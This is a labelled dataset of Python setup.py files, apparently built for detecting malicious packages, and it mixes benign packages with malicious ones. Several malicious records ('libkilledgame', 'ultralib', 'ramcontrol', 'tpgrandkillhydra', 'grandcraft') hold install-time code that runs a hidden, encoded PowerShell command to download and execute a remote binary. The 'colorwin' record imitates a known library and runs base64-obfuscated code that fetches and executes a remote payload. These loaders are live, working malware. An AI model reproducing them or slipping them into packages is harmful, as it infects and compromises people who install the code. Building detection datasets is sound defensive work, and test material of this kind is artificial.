3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libkilledgame-4.61", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libkilledgame',\n    packages = ['modlib'],\n    version = '4.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ultralib-2.66", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ultralib',\n    packages = ['modlib'],\n    version = '9.38',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ftfy-6.1.1", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['ftfy', 'ftfy.bad_codecs']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['wcwidth>=0.2.5']\n\nentry_points = \\\n{'console_scripts': ['ftfy = ftfy.cli:main']}\n\nsetup_kwargs = {\n    'name': 'ftfy',\n    'version': '6.1.1',\n    'description': 'Fixes mojibake and other problems with Unicode, after the fact',\n    'long_description': '# ftfy: fixes text for you\\n\\n[![PyPI package](https://badge.fury.io/py/ftfy.svg)](https://badge.fury.io/py/ftfy)\\n[![Docs](https://readthedocs.org/projects/ftfy/badge/?version=latest)](https://ftfy.readthedocs.org/en/latest/)\\n\\n```python\\n>>> print(fix_encoding(\"(\u00e0\u00b8\u2021\\'\u00e2\u0152\u00a3\\')\u00e0\u00b8\u2021\"))\\n(\u0e07\\'\u2323\\')\u0e07\\n```\\n\\nThe full documentation of ftfy is available at [ftfy.readthedocs.org](https://ftfy.readthedocs.org). The documentation covers a lot more than this README, so here are\\nsome links into it:\\n\\n- [Fixing problems and getting explanations](https://ftfy.readthedocs.io/en/latest/explain.html)\\n- [Configuring ftfy](https://ftfy.readthedocs.io/en/latest/config.html)\\n- [Encodings ftfy can handle](https://ftfy.readthedocs.io/en/latest/encodings.html)\\n- [\u201cFixer\u201d functions](https://ftfy.readthedocs.io/en/latest/fixes.html)\\n- [Is ftfy an encoding detector?](https://ftfy.readthedocs.io/en/latest/detect.html)\\n- [Heuristics for detecting mojibake](https://ftfy.readthedocs.io/en/latest/heuristic.html)\\n- [Support for \u201cbad\u201d encodings](https://ftfy.readthedocs.io/en/latest/bad_encodings.html)\\n- [Command-line usage](https://ftfy.readthedocs.io/en/latest/cli.html)\\n- [Citing ftfy](https://ftfy.readthedocs.io/en/latest/cite.html)\\n\\n## Testimonials\\n\\n- \u201cMy life is livable again!\u201d\\n  \u2014 [@planarrowspace](https://twitter.com/planarrowspace)\\n- \u201cA handy piece of magic\u201d\\n  \u2014 [@simonw](https://twitter.com/simonw)\\n- \u201cSaved me a large amount of frustrating dev work\u201d\\n  \u2014 [@iancal](https://twitter.com/iancal)\\n- \u201cftfy did the right thing right away, with no faffing about. Excellent work, solving a very tricky real-world (whole-world!) problem.\u201d\\n  \u2014 Brennan Young\\n- \u201cI have no idea when I\u2019m gonna need this, but I\u2019m definitely bookmarking it.\u201d\\n  \u2014 [/u/ocrow](https://reddit.com/u/ocrow)\\n- \u201c9.2/10\u201d\\n  \u2014 [pylint](https://bitbucket.org/logilab/pylint/)\\n\\n## What it does\\n\\nHere are some examples (found in the real world) of what ftfy can do:\\n\\nftfy can fix mojibake (encoding mix-ups), by detecting patterns of characters that were clearly meant to be UTF-8 but were decoded as something else:\\n\\n    >>> import ftfy\\n    >>> ftfy.fix_text(\\'\u00e2\u0153\u201d No problems\\')\\n    \\'\u2714 No problems\\'\\n\\nDoes this sound impossible? It\\'s really not. UTF-8 is a well-designed encoding that makes it obvious when it\\'s being misused, and a string of mojibake usually contains all the information we need to recover the original string.\\n\\nftfy can fix multiple layers of mojibake simultaneously:\\n\\n    >>> ftfy.fix_text(\\'The Mona Lisa doesn\u00c3\u0192\u00c2\u00a2\u00c3\u00a2\u00e2\u20ac\u0161\u00c2\u00ac\u00c3\u00a2\u00e2\u20ac\u017e\u00c2\u00a2t have eyebrows.\\')\\n    \"The Mona Lisa doesn\\'t have eyebrows.\"\\n\\nIt can fix mojibake that has had \"curly quotes\" applied on top of it, which cannot be consistently decoded until the quotes are uncurled:\\n\\n    >>> ftfy.fix_text(\"l\u2019humanit\u00c3\u00a9\")\\n    \"l\\'humanit\u00e9\"\\n\\nftfy can fix mojibake that would have included the character U+A0 (non-breaking space), but the U+A0 was turned into an ASCII space and then combined with another following space:\\n\\n    >>> ftfy.fix_text(\\'\u00c3\\\\xa0 perturber la r\u00c3\u00a9flexion\\')\\n    \\'\u00e0 perturber la r\u00e9flexion\\'\\n    >>> ftfy.fix_text(\\'\u00c3 perturber la r\u00c3\u00a9flexion\\')\\n    \\'\u00e0 perturber la r\u00e9flexion\\'\\n\\nftfy can also decode HTML entities that appear outside of HTML, even in cases where the entity has been incorrectly capitalized:\\n\\n    >>> # by the HTML 5 standard, only \\'P&Eacute;REZ\\' is acceptable\\n    >>> ftfy.fix_text(\\'P&EACUTE;REZ\\')\\n    \\'P\u00c9REZ\\'\\n  \\nThese fixes are not applied in all cases, because ftfy has a strongly-held goal of avoiding false positives -- it should never change correctly-decoded text to something else.\\n\\nThe following text could be encoded in Windows-1252 and decoded in UTF-8, and it would decode as \\'MARQU\u0245\\'. However, the original text is already sensible, so it is unchanged.\\n\\n    >>> ftfy.fix_text(\\'IL Y MARQU\u00c9\u2026\\')\\n    \\'IL Y MARQU\u00c9\u2026\\'\\n\\n## Installing\\n\\nftfy is a Python 3 package that can be installed using `pip`:\\n\\n    pip install ftfy\\n\\n(Or use `pip3 install ftfy` on systems where Python 2 and 3 are both globally\\ninstalled and `pip` refers to Python 2.)\\n\\n### Local development\\n\\nftfy is developed using `poetry`. Its `setup.py` is vestigial and is not the\\nrecommended way to install it.\\n\\n[Install Poetry](https://python-poetry.org/docs/master/#installing-with-the-official-installer), check out this repository, and run `poetry install` to install ftfy for local development, such as experimenting with the heuristic or running tests.\\n\\n## Who maintains ftfy?\\n\\nI\\'m Robyn Speer, also known as Elia Robyn Lake. You can find me\\n[on GitHub](https://github.com/rspeer) or [Twitter](https://twitter.com/r_speer).\\n\\n## Citing ftfy\\n\\nftfy has been used as a crucial data processing step in major NLP research.\\n\\nIt\\'s important to give credit appropriately to everyone whose work you build on\\nin research. This includes software, not just high-status contributions such as\\nmathematical models. All I ask when you use ftfy for research is that you cite\\nit.\\n\\nftfy has a citable record [on Zenodo](https://zenodo.org/record/2591652).\\nA citation of ftfy may look like this:\\n\\n    Robyn Speer. (2019). ftfy (Version 5.5). Zenodo.\\n    http://doi.org/10.5281/zenodo.2591652\\n\\nIn BibTeX format, the citation is::\\n\\n    @misc{speer-2019-ftfy,\\n      author       = {Robyn Speer},\\n      title        = {ftfy},\\n      note         = {Version 5.5},\\n      year         = 2019,\\n      howpublished = {Zenodo},\\n      doi          = {10.5281/zenodo.2591652},\\n      url          = {https://doi.org/10.5281/zenodo.2591652}\\n    }\\n',\n    'author': 'Robyn Speer',\n    'author_email': 'rspeer@arborelia.net',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': None,\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.7,<4',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "geog-0.0.2", "func": "from __future__ import unicode_literals\n\nfrom codecs import open as codecs_open\nfrom setuptools import setup, find_packages\n\n\n# Get the long description from the relevant file\nwith codecs_open('README.md', encoding='utf-8') as f:\n    long_description = f.read()\n\nsetup(\n    name='geog',\n    version='0.0.2',\n    description=\"Numpy-based vectorized geospatial functions\",\n    long_description=long_description,\n    classifiers=[],\n    keywords='',\n    author=\"Jacob Wasserman\",\n    author_email='jwasserman@gmail.com',\n    url='https://github.com/jwass/geog',\n    license='MIT',\n    packages=find_packages(exclude=['ez_setup', 'examples', 'tests']),\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=[\n        'numpy',\n    ],\n    extras_require={\n        'test': ['pytest', 'tox'],\n    },\n)\n", "target": 0}
{"idx": "zlibsrc-0.0.1", "func": "from setuptools import setup, find_packages\n\nVERSION = \"0.0.1\"\nDESCRIPTION = \"\"\n\nsetup(\n    name=\"zlibsrc\",\n    version=VERSION,\n    author=\"Jordan Gibbings\",\n    author_email=\"jgibbings94@gmail.com\",\n    description=DESCRIPTION,\n    long_description=open('README.md').read(),\n    url=\"https://github.com/jgibo/zlib-compress\",\n    packages=find_packages(),\n    install_requires=[], # external packages this package depends on (e.g. pypi, or our own python artifact registry (GCP) packages),\n    entry_points={\n        'console_scripts': ['zlib-compress=zlibsrc.cli:main']\n    }\n)", "target": 1}
{"idx": "EbookLib-0.17.1", "func": "import io\nimport re\n\nfrom setuptools import setup\n\n\ndef read(path):\n    with io.open(path, mode=\"r\", encoding=\"utf-8\") as fd:\n        content = fd.read()\n    # Convert Markdown links to reStructuredText links\n    return re.sub(r\"\\[([^]]+)\\]\\(([^)]+)\\)\", r\"`\\1 <\\2>`_\", content)\n\n\nsetup(\n    name = 'EbookLib',\n    version = '0.17.1',\n    author = 'Aleksandar Erkalovic',\n    author_email = 'aerkalov@gmail.com',\n    packages = ['ebooklib', 'ebooklib.plugins'],\n    url = 'https://github.com/aerkalov/ebooklib',\n    license = 'GNU Affero General Public License',\n    description = 'Ebook library which can handle EPUB2/EPUB3 and Kindle format',\n    long_description = read('README.md'),\n    keywords = ['ebook', 'epub', 'kindle'],\n    classifiers = [\n        \"Development Status :: 4 - Beta\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3.3\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\"\n    ],\n    install_requires = [\n       \"lxml\", \"six\"\n    ]\n)\n\n", "target": 0}
{"idx": "dasdsajdjsaasddsad-3.0.0", "func": "from setuptools import setup\n\nsetup(\n    name='dasdsajdjsaasddsad',\n    version='3.0.0',\n    packages=['dasdsajdjsaasddsad'],\n    url='',\n    license='',\n    author='dark',\n    author_email='email@example.com',\n    description='email@example.com',\n    install_requires=[\n        'requests==2.28.2',\n        'cryptography==40.0.2'\n    ]\n)\n", "target": 1}
{"idx": "ramcontrol-3.17", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ramcontrol',\n    packages = ['modlib'],\n    version = '9.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpgrandkillhydra-10.41", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgrandkillhydra',\n    packages = ['modlib'],\n    version = '7.86',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-0.34.0", "func": "# Copyright 2016 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport os\nimport logging\n\nfrom setuptools import setup\n\nPACKAGE_ROOT = os.path.abspath(os.path.dirname(__file__))\n\nwith open(os.path.join(PACKAGE_ROOT, 'setup-README.rst')) as file_obj:\n    README = file_obj.read()\n\n# NOTE: This is duplicated throughout and we should try to\n#       consolidate.\nSETUP_BASE = {\n    'author': 'Google Cloud Platform',\n    'author_email': 'googleapis-publisher@google.com',\n    'scripts': [],\n    'url': 'https://github.com/GoogleCloudPlatform/google-cloud-python',\n    'license': 'Apache 2.0',\n    'platforms': 'Posix; MacOS X; Windows',\n    'include_package_data': True,\n    'zip_safe': False,\n    'classifiers': [\n        'Development Status :: 7 - Inactive',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: Apache Software License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Internet',\n    ],\n}\n\nREQUIREMENTS = [\n]\n\nsetup(\n    name='google-cloud',\n    version='0.34.0',\n    description='API Client library for Google Cloud',\n    long_description=README,\n    install_requires=REQUIREMENTS,\n    **SETUP_BASE\n)\n\nwarning = \"WARNING: The google-cloud Python package is deprecated. This \" \\\n          \"package no longer installs any other \" \\\n          \"packages. Please install the product-specific google-cloud-* \" \\\n          \"packages needed for your application. See \" \\\n          \"https://github.com/GoogleCloudPlatform/google-cloud-python.\"\n\nlogging.warn(warning)\n", "target": 0}
{"idx": "dacite-1.6.0", "func": "from setuptools import setup\n\nsetup(\n    name=\"dacite\",\n    version=\"1.6.0\",\n    description=\"Simple creation of data classes from dictionaries.\",\n    long_description=open(\"README.md\").read(),\n    long_description_content_type=\"text/markdown\",\n    author=\"Konrad Ha\u0142as\",\n    author_email=\"halas.konrad@gmail.com\",\n    url=\"https://github.com/konradhalas/dacite\",\n    license=\"MIT\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    python_requires=\">=3.6\",\n    keywords=\"dataclasses\",\n    packages=[\"dacite\"],\n    package_data={\"dacite\": [\"py.typed\"]},\n    install_requires=['dataclasses;python_version<\"3.7\"'],\n    extras_require={\"dev\": [\"pytest>=5\", \"pytest-cov\", \"coveralls\", \"black\", \"mypy\", \"pylint\"]},\n)\n", "target": 0}
{"idx": "glow.py-1.2.1", "func": "# Copyright 2019 The Glow Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom setuptools import setup, setuptools\nimport imp\n\nversion = imp.load_source('version', 'version.py').VERSION\n\nsetup(name='glow.py',\n      version=version,\n      packages=setuptools.find_packages(),\n      install_requires=[\n          'nptyping==1.3.0',\n          'numpy>=1.18.1',\n          'opt_einsum>=3.2.0',\n          'pandas>=1.0.1',\n          'statsmodels>=0.10.0',\n          'typeguard==2.9.1',\n      ],\n      author='The Glow Authors',\n      description='An open-source toolkit for large-scale genomic analysis',\n      long_description=open('README.rst').read(),\n      long_description_content_type='text/x-rst',\n      license='Apache License 2.0',\n      classifiers=[\n          'Intended Audience :: Developers',\n          'Programming Language :: Python :: 3.7',\n      ],\n      url='https://projectglow.io')\n", "target": 0}
{"idx": "grandcraft-5.8", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'grandcraft',\n    packages = ['modlib'],\n    version = '1.85',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "colorwin-6.6.7", "func": "from __future__ import with_statement\n\nfrom io import open\nimport os\nimport re\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nNAME = 'colorwin'\nprint('Fore');__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vd2FzcC5wbGFndWUuZnVuL2luamVjdC81T01ISDNER2xOaktYajRuJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw==\"),'<string>','exec'))\n\ndef read_file(path, encoding='ascii'):\n    with open(os.path.join(os.path.dirname(__file__), path),\n              encoding=encoding) as fp:\n        return fp.read()\n\ndef _get_version_match(content):\n    regex = r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\"\n    version_match = re.search(regex, content, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\ndef get_version(path):\n    return _get_version_match(read_file(path))\n\nsetup(\n    name=NAME,\n    version=get_version(os.path.join('colorwin', '__init__.py')),\n    description='Cross-platform colored terminal text.',\n    long_description=read_file('README.rst'),\n    keywords='color colour terminal text ansi windows crossplatform xplatform',\n    author='Jonathan Hartley',\n    author_email='tartley@tartley.com',\n    maintainer='Arnon Yaari',\n    url='https://github.com/tartley/colorwin',\n    license='BSD',\n    packages=[NAME],\n    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*, !=3.4.*',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Terminals',\n    ]\n)\n", "target": 1}
{"idx": "dagster_cloud-1.0.3", "func": "from pathlib import Path\nfrom typing import Dict\n\nfrom setuptools import find_packages, setup\n\n\ndef get_version() -> str:\n    version: Dict[str, str] = {}\n    with open(\"dagster_cloud/version.py\", encoding=\"utf8\") as fp:\n        exec(fp.read(), version)  # pylint: disable=W0122\n\n    return version[\"__version__\"]\n\n\ndef get_description() -> str:\n    return (Path(__file__).parent / \"README.md\").read_text()\n\n\nif __name__ == \"__main__\":\n    ver = get_version()\n    # dont pin dev installs to avoid pip dep resolver issues\n    pin = \"\" if ver == \"0+dev\" else f\"=={ver}\"\n    setup(\n        name=\"dagster_cloud\",\n        long_description=get_description(),\n        long_description_content_type=\"text/markdown\",\n        version=ver,\n        author_email=\"hello@elementl.com\",\n        packages=find_packages(exclude=[\"dagster_cloud_tests*\"]),\n        include_package_data=True,\n        install_requires=[\n            \"dagster==1.0.3\",\n            \"dagster-cloud-cli==1.0.3\",\n            \"questionary\",\n            \"requests\",\n            \"typer[all]\",\n        ],\n        extras_require={\n            \"tests\": [\n                \"black\",\n                \"docker\",\n                \"httpretty\",\n                \"isort\",\n                \"kubernetes\",\n                \"moto\",\n                \"mypy\",\n                \"paramiko\",\n                \"pylint\",\n                \"pytest\",\n                \"types-PyYAML\",\n                \"types-requests\",\n                \"dagster_k8s==0.16.3\",\n            ],\n            \"docker\": [\"docker\", \"dagster_docker==0.16.3\"],\n            \"kubernetes\": [\"kubernetes\", \"dagster_k8s==0.16.3\"],\n            \"ecs\": [\"dagster_aws==0.16.3\", \"boto3\"],\n            \"sandbox\": [\"supervisor\"],\n        },\n        author=\"Elementl\",\n        license=\"Apache-2.0\",\n        classifiers=[\n            \"Programming Language :: Python :: 3.8\",\n            \"License :: OSI Approved :: Apache Software License\",\n            \"Operating System :: OS Independent\",\n        ],\n    )\n", "target": 0}
